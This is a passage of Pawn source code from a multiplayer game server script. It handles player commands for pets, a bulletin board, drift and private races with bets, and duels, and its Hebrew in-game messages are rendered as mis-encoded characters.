			GetPlayerPos(id,p[0],p[1],p[2]);
			if(!ObjectToPoint(Pets[playerinfo[playerid][pet][0]][petRadius],playerinfo[playerid][pet][1],p[0],p[1],p[2])) return SendClientMessage(playerid,red," .ф∙чўя фцф °чхў юущ");
			if(GetPlayerVirtualWorld(id) != GetPlayerVirtualWorld(playerid)) return SendClientMessage(playerid,red," .фчщф ∙ьъ ьр щыхьф ь·ўхє ∙чўя ∙ьр сЄхьюъ");
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetPlayerFacingAngle(playerid,p[3]);
			playerinfo[playerid][pet][3] = 1;
			DestroyObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][1] = CreateObject(Pets[playerinfo[playerid][pet][0]][petModel],p[0]+(playerinfo[playerid][pet][0] >= pet_turtle? 6.5:2.8),p[1],p[2],0.000000,0.000000,0.000000);
			SetTimerPck(playerinfo[playerid][pet][4],"PetAttacking",200,1,"dd",playerid,id);
		}
		else if(equal(cmd,"stop"))
		{
			if(!playerinfo[playerid][pet][0]) return SendClientMessage(playerid,red," .рщя ьъ чщф");
			if(!playerinfo[playerid][pet][2]) return SendClientMessage(playerid,red," .фчщф ∙ьъ ьр счхї");
			if(!playerinfo[playerid][pet][3]) return SendClientMessage(playerid,red," .фчщф ∙ьъ ьр ·хўЇ·");
			StopPetAttacking(playerid);
		}
		else if(equal(cmd,"remove"))
		{
			if(!playerinfo[playerid][pet][0]) return SendClientMessage(playerid,red," .рщя ьъ чщф");
			if(playerinfo[playerid][pet][3]) StopPetAttacking(playerid);
			if(IsValidObject(playerinfo[playerid][pet][1])) DestroyObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][2] = 0;
			playerinfo[playerid][pet][3] = 0;
			playerinfo[playerid][pet][0] = 0;
			SendClientMessage(playerid,green," .ючў· р· фчщф ∙ьъ");
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· чщф ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/bb"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /bb [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /bb show - ЎЇщщф сьхч фюхуЄх·");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /bb showall - фЎт· ьхч фюхуЄх· ьыхьэ");
				SendClientMessage(playerid,white," /bb remove [message number] - ючщў· юхуЄф");
				SendClientMessage(playerid,white," /bb add [message number] [text] - фхёЇ· юхуЄф");
			}
			return 1;
		}
		new string[M_S];
		if(equal(cmd,"show"))
		{
			SendClientMessage(playerid,lightblue," [ " webpage " ] :ьхч юхуЄх·");
			for(new i=1;i<=max_bb;i++)
			{
				format(string,sizeof(string),"Message%d",i);
				if(fkeyexist(file_bb,string) && !equal(fgetstring(file_bb,string),"None"))
				{
					format(string,sizeof(string)," Х %d) " @c(yellow) "%s",i,fgetstring(file_bb,string));
					SendClientMessage(playerid,white,string);
				}
			}
		}
		else if(equal(cmd,"showall"))
		{
			SendClientMessageToAll(lightblue," [ " webpage " ] :ьхч юхуЄх·");
			for(new i=1;i<=max_bb;i++)
			{
				format(string,sizeof(string),"Message%d",i);
				if(fkeyexist(file_bb,string) && !equal(fgetstring(file_bb,string),"None"))
				{
					format(string,sizeof(string)," Х %d) " @c(yellow) "%s",i,fgetstring(file_bb,string));
					SendClientMessageToAll(white,string);
				}
			}
		}
		else if(equal(cmd,"remove"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(playerinfo[playerid][admin] < 15) return SendClientMessage(playerid,red," .сыущ ьсЎЄ Їўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bb remove [message number] :Ўх°· ф∙щюх∙");
			new number = strval(cmd), key[32];
			format(key,sizeof(key),"Message%d",number);
			if(number < 1 || number > max_bb || !fkeyexist(file_bb,key)) return SendClientMessage(playerid,red," .юёЇ° фхуЄф ∙тхщ");
			fsetstring(file_bb,key,"None");
			format(string,sizeof(string)," .ючў· р· фхуЄф юёЇ° %d",number);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"add"))
		{
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(playerinfo[playerid][admin] < 15) return SendClientMessage(playerid,red," .сыущ ьсЎЄ Їўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
			new text[256];
			cmd = strtok(cmdtext,idx), text = strrest(cmdtext,idx);
			if(!strlen(cmd) || !strlen(text) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bb add [message number] [text] :Ўх°· ф∙щюх∙");
			new number = strval(cmd);
			format(string,sizeof(string),"Message%d",number);
			if(number < 1 || number > max_bb || !fkeyexist(file_bb,string)) return SendClientMessage(playerid,red," .юёЇ° фхуЄф ∙тхщ");
			if(advertisement(text,"ьхч юхуЄх· (Їўхуф)",playerid,"found in /bb add")) return 1;
			fixchars(text);
			SendClientMessage(playerid,green," :фхёЇ· юхуЄф ььхч фюхуЄх·");
			SendClientMessage(playerid,green,text);
			format(text,sizeof(text),@c(yellow) " л %s ╗ " @c(yellow) "%s",GetName(playerid),text);
			fsetstring(file_bb,string,text);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ьхч юхуЄх· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/drift"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /drift [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /drift invite [id/name] [place] [bet] - фцюЁф ьу°щЇш");
			SendClientMessage(playerid,white," /drift accept - рщ∙х° фцюЁф ьу°щЇш");
			SendClientMessage(playerid,white," /drift cancel - сщшхь фцюЁф ьу°щЇш");
			SendClientMessage(playerid,white," /drift quit - ьЎр· юфу°щЇш фЁхычщ ∙ьъ");
			return 1;
		}
		if(equal(cmd,"invite"))
		{
			if(!playerinfo[playerid][invitetime][0]) return SendClientMessage(playerid,red," .·хыь ь∙ьхч фцюЁх· ∙хс сў°хс");
			new id, bet2, place, string[M_S];
			if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .р·ф ыс° су°щЇш");
			if(!CanUseCommand(playerid)) return 1;
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /drift invite [id/name] [place] [bet] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфцющя р· ЄЎюъ");
			cmd = strtok(cmdtext,idx), place = !strlen(cmd) || !IsNumeric(cmd)? 1:strval(cmd), cmd = strtok(cmdtext,idx), bet2 = !strlen(cmd) || !IsNumeric(cmd)? 0:strval(cmd);
			if(place < 1 || place > 3) return SendClientMessage(playerid,red," .юёЇ° юўхэ ∙тхщ");
			if(bet2 < 0 || bet2 > GetMoney(playerid)) return SendClientMessage(playerid,red," .ёыхэ фщюх° ∙тхщ");
			if(playerinfo[id][indrift]) return SendClientMessage(playerid,red," .ф∙чўя ∙°Ўщ· ьфцющя ыс° су°щЇш");
			playerinfo[playerid][invitetime][0]--;
			format(string,sizeof(string)," /cancel :ьсщшхь ,/accept :фцющя рх·ъ ьу°щЇш Єь %d$ сцщ°ф юёЇ° %d, ьрщ∙х° %s",bet2,place,GetName(playerid));
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," .ьу°щЇш Єь %d$ сцщ°ф юёЇ° %d %s фцюЁ· р·",bet2,place,GetName(id));
			SendClientMessage(playerid,green,string);
			playerinfo[id][dinvited] = playerid, playerinfo[playerid][dinvited] = id, playerinfo[playerid][bet] = bet2, playerinfo[playerid][dinviter] = 1, playerinfo[playerid][dplace] = place;
			playerinfo[id][lastrec] = 1;
		}
		else if(equal(cmd,"accept"))
		{
			new string[M_S];
			if(!CanUseCommand(playerid)) return 1;
			if(playerinfo[playerid][dinvited] == -1 || playerinfo[playerid][dinviter]) return SendClientMessage(playerid,red," .ьр фхцюЁ· ьу°щЇш");
			if(!CanUseCommand(playerid)) return 1;
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс");
			new world = GetEmptyWorld();
			if(world == -1) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьфыЁщё рх·ъ ьу°щЇш");
			SendClientMessage(playerid,green," .рщ∙°· р· ффцюЁф ьу°щЇш");
			format(string,sizeof(string)," .рщ∙° р· ффцюЁф ьу°щЇш %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][dinvited],green,string);
			if(GetMoney(playerinfo[playerid][dinvited]) < playerinfo[playerinfo[playerid][dinvited]][bet])
			{
				playerinfo[playerinfo[playerid][dinvited]][bet] = 0;
				SendClientMessage(playerid,red," .юыщххя ∙ющ ∙∙ьч р· ффцюЁф ыс° ьр ючцщў сёыхэ фыёє ∙ь ффщюх°, рщя фщюх° ьюЁЎч су°щЇш");
			}
			GiveMoney(playerinfo[playerid][dinvited],0-playerinfo[playerinfo[playerid][dinvited]][bet],2);
			playerinfo[playerid][indrift] = 1, playerinfo[playerinfo[playerid][dinvited]][indrift] = 1,
			playerinfo[playerid][driftcp] = 2, playerinfo[playerinfo[playerid][dinvited]][driftcp] = 2,
			playerinfo[playerid][bet] = playerinfo[playerinfo[playerid][dinvited]][bet],
			playerinfo[playerid][dplace] = playerinfo[playerinfo[playerid][dinvited]][dplace];
			playerinfo[playerid][dcd][0] = 5, playerinfo[playerinfo[playerid][dinvited]][dcd][0] = 5;
			SetTimerPck(playerinfo[playerid][dcd][1],"DriftCD",1000,1,"ii",playerid,playerinfo[playerid][dinvited]);
			playerinfo[playerid][lastrec] = 0;
			switch(playerinfo[playerid][dplace])
			{
				case 1:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_1[0][0],DriftPositions_1[0][1],DriftPositions_1[0][2],playerinfo[playerid][dinvited]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_1[0][3]);
					SetVehiclePos(GetPlayerVehicleID(playerid),DriftPositions_1[1][0],DriftPositions_1[1][1],DriftPositions_1[1][2],playerid);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),DriftPositions_1[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,DriftPositions_1[2][0],DriftPositions_1[2][1],DriftPositions_1[2][2],DriftPositions_1[3][0],DriftPositions_1[3][1],DriftPositions_1[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][dinvited],0,DriftPositions_1[2][0],DriftPositions_1[2][1],DriftPositions_1[2][2],DriftPositions_1[3][0],DriftPositions_1[3][1],DriftPositions_1[3][2],14.5);
				}
				case 2:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_2[0][0],DriftPositions_2[0][1],DriftPositions_2[0][2],playerinfo[playerid][dinvited]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_2[0][3]);
					SetVehiclePos(GetPlayerVehicleID(playerid),DriftPositions_2[1][0],DriftPositions_2[1][1],DriftPositions_2[1][2],playerid);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),DriftPositions_2[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,DriftPositions_2[2][0],DriftPositions_2[2][1],DriftPositions_2[2][2],DriftPositions_2[3][0],DriftPositions_2[3][1],DriftPositions_2[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][dinvited],0,DriftPositions_2[2][0],DriftPositions_2[2][1],DriftPositions_2[2][2],DriftPositions_2[3][0],DriftPositions_2[3][1],DriftPositions_2[3][2],14.5);
				}
				case 3:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_3[0][0],DriftPositions_3[0][1],DriftPositions_3[0][2],playerinfo[playerid][dinvited]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][dinvited]),DriftPositions_3[0][3]);
					SetVehiclePos(GetPlayerVehicleID(playerid),DriftPositions_3[1][0],DriftPositions_3[1][1],DriftPositions_3[1][2],playerid);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),DriftPositions_3[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,DriftPositions_3[2][0],DriftPositions_3[2][1],DriftPositions_3[2][2],DriftPositions_3[3][0],DriftPositions_3[3][1],DriftPositions_3[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][dinvited],0,DriftPositions_3[2][0],DriftPositions_3[2][1],DriftPositions_3[2][2],DriftPositions_3[3][0],DriftPositions_3[3][1],DriftPositions_3[3][2],14.5);
				}
			}
			SetPlayerVirtualWorld(playerid,world);
			SetPlayerVirtualWorld(playerinfo[playerid][dinvited],world);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][dinvited]),world);
			SetCameraBehindPlayer(playerid);
			SetCameraBehindPlayer(playerinfo[playerid][dinvited]);
			SetFreeze(playerid,1);
			SetFreeze(playerinfo[playerid][dinvited],1);
			ResetWeapons(playerid);
			ResetWeapons(playerinfo[playerid][dinvited]);
		}
		else if(equal(cmd,"cancel"))
		{
			new string[M_S];
			if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .р·ф ыс° су°щЇш");
			if(playerinfo[playerid][dinvited] == -1) return SendClientMessage(playerid,red," .ьр фхцюЁ· ьу°щЇш");
			SendClientMessage(playerid,green," .сщшь· р· ффцюЁф ьу°щЇш");
			format(string,sizeof(string)," .сщшь р· ффцюЁф ьу°щЇш %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][dinvited],green,string);
			playerinfo[playerinfo[playerid][dinvited]][lastrec] = 0;
			playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0, playerinfo[playerid][dinviter] = 0, playerinfo[playerinfo[playerid][dinvited]][bet] = 0, playerinfo[playerinfo[playerid][dinvited]][dplace] = 0, playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1, playerinfo[playerid][dinvited] = -1, playerinfo[playerid][dplace] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			new string[M_S];
			if(!playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .р·ф ьр су°щЇш");
			SendClientMessage(playerid,green," .щЎр· юфу°щЇш");
			format(string,sizeof(string)," .щщЎр юфу°щЇш, ЁщЎчхя шыЁщ ьъ %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][dinvited],green,string);
			GiveMoney(playerinfo[playerid][dinvited],playerinfo[playerinfo[playerid][dinvited]][bet],2);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][dinvited]));
			SetPlayerVirtualWorld(playerid,world_normal);
			SetPlayerVirtualWorld(playerinfo[playerid][dinvited],world_normal);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][dinvited]),world_normal);
			DisablePlayerRaceCheckpoint(playerid);
			DisablePlayerRaceCheckpoint(playerinfo[playerid][dinvited]);
			playerinfo[playerinfo[playerid][dinvited]][driftcp] = 0,
			playerinfo[playerinfo[playerid][dinvited]][indrift] = 0,
			playerinfo[playerinfo[playerid][dinvited]][bet] = 0,
			playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
			playerinfo[playerinfo[playerid][dinvited]][dplace] = 0,
			playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1;
			playerinfo[playerid][indrift] = 0,
			playerinfo[playerid][driftcp] = 0,
			playerinfo[playerid][bet] = 0,
			playerinfo[playerid][dinviter] = 0,
			playerinfo[playerid][dplace] = 0,
			playerinfo[playerid][dinvited] = -1;
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· у°щЇш ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/prace"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /prace [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /prace invite [id/name] [place] - фцюЁф ьющ°хї Ї°шщ");
			SendClientMessage(playerid,white," /prace accept - рщ∙х° фцюЁф ьющ°хї Ї°шщ");
			SendClientMessage(playerid,white," /prace cancel - сщшхь фцюЁф ьющ°хї Ї°шщ");
			SendClientMessage(playerid,white," /prace quit - ьЎр· юфющ°хї фЇ°шщ фЁхычщ ∙ьъ");
			return 1;
		}
		if(equal(cmd,"invite"))
		{
			new id, place, string[M_S];
			if(playerinfo[playerid][inprace]) return SendClientMessage(playerid,red," .р·ф ыс° сющ°хї Ї°шщ");
			if(!CanUseCommand(playerid)) return 1;
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /prace invite [id/name] [place] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфцющя р· ЄЎюъ");
			cmd = strtok(cmdtext,idx), place = !strlen(cmd) || !IsNumeric(cmd)? 1:strval(cmd), cmd = strtok(cmdtext,idx);
			if(place < 1 || place > 3) return SendClientMessage(playerid,red," .юёЇ° юўхэ ∙тхщ");
			if(playerinfo[id][inprace]) return SendClientMessage(playerid,red," .ф∙чўя ∙°Ўщ· ьфцющя ыс° сющ°хї Ї°шщ");
			format(string,sizeof(string)," /cancel :ьсщшхь ,/accept :фцющя рх·ъ ьющ°хї Ї°шщ сцщ°ф юёЇ° %d, ьрщ∙х° %s",place,GetName(playerid));
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," .ьющ°хї Ї°шщ сцщ°ф юёЇ° %d %s фцюЁ· р·",place,GetName(id));
			SendClientMessage(playerid,green,string);
			playerinfo[id][prinvited] = playerid, playerinfo[playerid][prinvited] = id, playerinfo[playerid][prinviter] = 1, playerinfo[playerid][prplace] = place;
		}
		else if(equal(cmd,"accept"))
		{
			new string[M_S];
			if(!CanUseCommand(playerid)) return 1;
			if(playerinfo[playerid][prinvited] == -1 || playerinfo[playerid][prinviter]) return SendClientMessage(playerid,red," .ьр фхцюЁ· ьющ°хї Ї°шщ");
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс");
			new world = GetEmptyWorld();
			if(world == -1) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьфыЁщё рх·ъ ьющ°хї фЇ°шщ");
			SendClientMessage(playerid,green," .рщ∙°· р· ффцюЁф ьющ°хї фЇ°шщ");
			format(string,sizeof(string)," .рщ∙° р· ффцюЁф ьющ°хї фЇ°шщ %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][prinvited],green,string);
			playerinfo[playerid][inprace] = 1, playerinfo[playerinfo[playerid][prinvited]][inprace] = 1,
			playerinfo[playerid][pracecp] = 2, playerinfo[playerinfo[playerid][prinvited]][pracecp] = 2,
			playerinfo[playerid][prplace] = playerinfo[playerinfo[playerid][prinvited]][prplace],
			playerinfo[playerid][prcd][0] = 5, playerinfo[playerinfo[playerid][prinvited]][prcd][0] = 5;
			SetTimerPck(playerinfo[playerid][prcd][1],"RaceCD",1000,1,"ii",playerid,playerinfo[playerid][prinvited]);
			playerinfo[playerid][lastrec] = 0;
			switch(playerinfo[playerid][prplace])
			{
				case 1:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][prinvited]),PRacePositions_1[0][0],PRacePositions_1[0][1],PRacePositions_1[0][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][prinvited]),PRacePositions_1[0][3]);
					SetVehiclePos(GetPlayerVehicleID(playerid),PRacePositions_1[1][0],PRacePositions_1[1][1],PRacePositions_1[1][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),PRacePositions_1[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,PRacePositions_1[2][0],PRacePositions_1[2][1],PRacePositions_1[2][2],PRacePositions_1[3][0],PRacePositions_1[3][1],PRacePositions_1[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][prinvited],0,PRacePositions_1[2][0],PRacePositions_1[2][1],PRacePositions_1[2][2],PRacePositions_1[3][0],PRacePositions_1[3][1],PRacePositions_1[3][2],14.5);
				}
				case 2:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][prinvited]),PRacePositions_2[0][0],PRacePositions_2[0][1],PRacePositions_2[0][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][prinvited]),PRacePositions_2[0][3]);
					SetVehiclePos(GetPlayerVehicleID(playerid),PRacePositions_2[1][0],PRacePositions_2[1][1],PRacePositions_2[1][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),PRacePositions_2[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,PRacePositions_2[2][0],PRacePositions_2[2][1],PRacePositions_2[2][2],PRacePositions_2[3][0],PRacePositions_2[3][1],PRacePositions_2[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][prinvited],0,PRacePositions_2[2][0],PRacePositions_2[2][1],PRacePositions_2[2][2],PRacePositions_2[3][0],PRacePositions_2[3][1],PRacePositions_2[3][2],14.5);
				}
				case 3:
				{
					SetVehiclePos(GetPlayerVehicleID(playerinfo[playerid][prinvited]),PRacePositions_3[0][0],PRacePositions_3[0][1],PRacePositions_3[0][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerinfo[playerid][prinvited]),PRacePositions_3[0][3]);
					SetVehiclePos(GetPlayerVehicleID(playerid),PRacePositions_3[1][0],PRacePositions_3[1][1],PRacePositions_3[1][2]);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),PRacePositions_3[1][3]);
					SetPlayerRaceCheckpoint(playerid,0,PRacePositions_3[2][0],PRacePositions_3[2][1],PRacePositions_3[2][2],PRacePositions_3[3][0],PRacePositions_3[3][1],PRacePositions_3[3][2],14.5);
					SetPlayerRaceCheckpoint(playerinfo[playerid][prinvited],0,PRacePositions_3[2][0],PRacePositions_3[2][1],PRacePositions_3[2][2],PRacePositions_3[3][0],PRacePositions_3[3][1],PRacePositions_3[3][2],14.5);
				}
			}
			SetPlayerVirtualWorld(playerid,world);
			SetPlayerVirtualWorld(playerinfo[playerid][prinvited],world);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][prinvited]),world);
			SetCameraBehindPlayer(playerid);
			SetCameraBehindPlayer(playerinfo[playerid][prinvited]);
			SetFreeze(playerid,1);
			SetFreeze(playerinfo[playerid][prinvited],1);
			ResetWeapons(playerid);
			ResetWeapons(playerinfo[playerid][prinvited]);
		}
		else if(equal(cmd,"cancel"))
		{
			new string[M_S];
			if(playerinfo[playerid][inprace]) return SendClientMessage(playerid,red," .р·ф ыс° сющ°хї Ї°шщ");
			if(playerinfo[playerid][prinvited] == -1) return SendClientMessage(playerid,red," .ьр фхцюЁ· ьющ°хї Ї°шщ");
			SendClientMessage(playerid,green," .сщшь· р· ффцюЁф ьющ°хї фЇ°шщ");
			format(string,sizeof(string)," .сщшь р· ффцюЁф ьющ°хї фЇ°шщ %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][prinvited],green,string);
			playerinfo[playerinfo[playerid][prinvited]][lastrec] = 0;
			playerinfo[playerinfo[playerid][prinvited]][prinviter] = 0, playerinfo[playerid][prinviter] = 0, playerinfo[playerinfo[playerid][prinvited]][prplace] = 0, playerinfo[playerinfo[playerid][prinvited]][prinvited] = -1, playerinfo[playerid][prinvited] = -1, playerinfo[playerid][prplace] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			new string[M_S];
			if(!playerinfo[playerid][inprace]) return SendClientMessage(playerid,red," .р·ф ьр сющ°хї Ї°шщ");
			SendClientMessage(playerid,green," .щЎр· юфющ°хї фЇ°шщ");
			format(string,sizeof(string)," .щщЎр юфющ°хї фЇ°шщ, ЁщЎчхя шыЁщ ьъ %s",GetName(playerid));
			SendClientMessage(playerinfo[playerid][prinvited],green,string);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][prinvited]));
			SetPlayerVirtualWorld(playerid,world_normal);
			SetPlayerVirtualWorld(playerinfo[playerid][prinvited],world_normal);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerinfo[playerid][prinvited]),world_normal);
			DisablePlayerRaceCheckpoint(playerid);
			DisablePlayerRaceCheckpoint(playerinfo[playerid][prinvited]);
			playerinfo[playerinfo[playerid][prinvited]][pracecp] = 0,
			playerinfo[playerinfo[playerid][prinvited]][inprace] = 0,
			playerinfo[playerinfo[playerid][prinvited]][prinviter] = 0,
			playerinfo[playerinfo[playerid][prinvited]][prplace] = 0,
			playerinfo[playerinfo[playerid][prinvited]][prinvited] = -1;
			playerinfo[playerid][inprace] = 0,
			playerinfo[playerid][pracecp] = 0,
			playerinfo[playerid][prinviter] = 0,
			playerinfo[playerid][prplace] = 0,
			playerinfo[playerid][prinvited] = -1;
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ющ°хї Ї°шщ ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/duel"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /duel [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /duel invite [id/name] [place] - фцюЁф ьў°с");
			SendClientMessage(playerid,white," /duel accept - рщ∙х° фцюЁф ьў°с");
			SendClientMessage(playerid,white," /duel cancel - сщшхь фцюЁф ьў°с");
			SendClientMessage(playerid,white," /duel quit - ьЎр· юфў°с фЁхычщ ∙ьъ");
			return 1;
		}
		if(equal(cmd,"invite"))
		{
			if(!playerinfo[playerid][invitetime][0]) return SendClientMessage(playerid,red," .·хыь ь∙ьхч фцюЁх· ∙хс сў°хс");
			new id, place;
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .р·ф ыс° сў°с");
			if(!CanUseCommand(playerid)) return 1;
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхї ь°ыс");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				format(cmd,sizeof(cmd)," /duel invite [id/name] [place 1-%d] :Ўх°· ф∙щюх∙",sizeof(BattlePositions));
				return SendClientMessage(playerid,white,cmd);
			}
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфцющя р· ЄЎюъ");
			if(playerinfo[id][inbattle]) return SendClientMessage(playerid,red," .ф∙чўя ∙°Ўщ· ьфцющя ыс° сў°с");
			cmd = strtok(cmdtext,idx), place = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
			if(place < 1 || place > sizeof(BattlePositions)) return SendClientMessage(playerid,red," .юёЇ° юўхэ ў°с ∙тхщ");
			playerinfo[playerid][invitetime][0]--;
			ShowPlayerDialog(playerid,dialog_duel,DIALOG_STYLE_LIST,@c(lightblue) "Private Battles","ўьрёщ - Ё∙ў рчу\nющхчу - ыюф Ё∙ўщэ\n°ыс - ў°с Єэ ыьщ °ыс щх°щэ","фю∙ъ","сщшхь");
			playerinfo[playerid][duelclick] = id, playerinfo[playerid][bplace] = place;
		}
		else if(equal(cmd,"accept"))
		{
			new string[M_S];
			if(!CanUseCommand(playerid)) return 1;
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .р·ф ыс° сў°с");
			if(playerinfo[playerid][binvited] == -1 || (playerinfo[playerid][binvited] != -1 && playerinfo[playerid][binviter])) return SendClientMessage(playerid,red," .ьр фхцюЁ· ьў°с");
			if(!CanUseCommand(playerid)) return 1;
			if(!CanUseDuel(playerinfo[playerid][binvited])) return SendClientMessage(playerid,red," .фю∙·ю∙ ∙фцющя рх·ъ ьр щыхь ьфЎш°є ьў°с ыЄ·"), SendClientMessage(playerinfo[playerid][binvited],red," .фю∙·ю∙ ∙фцюЁ· ьў°с ьр щыхь ьр∙° р· фсў∙ф сюЎсъ фЁхычщ");
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхї ь°ыс");
